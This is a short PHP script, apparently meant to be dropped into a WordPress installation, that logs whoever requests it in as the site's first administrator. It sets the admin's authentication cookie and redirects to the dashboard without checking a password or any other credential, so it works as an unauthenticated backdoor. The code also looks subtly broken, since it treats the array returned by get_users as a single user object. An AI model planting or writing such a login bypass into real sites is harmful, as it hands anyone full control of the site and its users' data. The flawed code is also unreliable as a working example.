<?php
// force-admin.php
define('WP_USE_THEMES', false);
require_once('wp-load.php');

// Login paksa sebagai administrator pertama
$admin = get_users(['role' => 'administrator', 'number' => 1]);

if($admin) {
    wp_clear_auth_cookie();
    wp_set_current_user($admin->ID);
    wp_set_auth_cookie($admin->ID);
    
    // Redirect ke dashboard
    wp_redirect(admin_url());
    exit;
} else {
    die("Tidak ditemukan user administrator!");
}